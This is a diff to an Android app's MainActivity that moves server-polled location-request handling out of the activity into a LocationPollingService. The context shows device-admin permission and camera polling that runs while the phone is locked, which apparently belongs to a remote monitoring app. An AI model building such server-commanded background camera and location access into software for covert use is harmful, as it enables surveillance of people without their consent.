@@ -5,11 +5,8 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Handler;
-import android.os.Looper;
 import android.widget.Toast;
 
-import org.json.JSONObject;
 
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -25,18 +22,6 @@ public class MainActivity
 
     private static final int RUNTIME_PERMISSION_CODE = 100;
     private static final int DEVICE_ADMIN_CODE = 101;
-
-    private static final long
-            LOCATION_POLL_INTERVAL_MS = 10000L;
-
-    private final Handler
-            locationCommandHandler =
-            new Handler(
-                    Looper.getMainLooper()
-            );
-
-    private boolean locationPollingStarted =
-            false;
 
     @Override
     protected void onCreate(
@@ -173,87 +158,11 @@ public class MainActivity
         // Polling kamera dipindahkan ke CameraPollingService supaya
         // tetap jalan meski app di-minimize atau HP dikunci.
         CameraPollingService.start(this);
-        startLocationCommandPolling();
-    }
-
-    private void startLocationCommandPolling() {
-
-        if (locationPollingStarted) {
-            return;
-        }
-
-        locationPollingStarted = true;
-
-        locationCommandHandler.post(
-                new Runnable() {
-
-                    @Override
-                    public void run() {
-
-                        checkLocationCommand();
-
-                        locationCommandHandler
-                                .postDelayed(
-                                        this,
-                                        LOCATION_POLL_INTERVAL_MS
-                                );
-                    }
-                }
-        );
-    }
-
-    private void checkLocationCommand() {
-
-        new Thread(
-                () -> {
-
-                    JSONObject result =
-                            ApiHelper
-                                    .getPendingLocationRequest();
-
-                    if (result == null) {
-                        return;
-                    }
-
-                    if (!"success".equalsIgnoreCase(
-                            result.optString("status", "")
-                    )) {
-                        return;
-                    }
-
-                    JSONObject request =
-                            result.optJSONObject("request");
-
-                    if (request == null) {
-                        return;
-                    }
-
-                    String requestId =
-                            request.optString("id", "");
-
-                    if (requestId.isEmpty()) {
-                        return;
-                    }
-
-                    LocationRequestService.offer(
-                            MainActivity.this,
-                            requestId,
-                            ""
-                    );
-                }
-        ).start();
+        LocationPollingService.start(this);
     }
 
     @Override
     protected void onDestroy() {
-
-        locationCommandHandler
-                .removeCallbacksAndMessages(
-                        null
-                );
-
-        locationPollingStarted = false;
-
         super.onDestroy();
     }
 
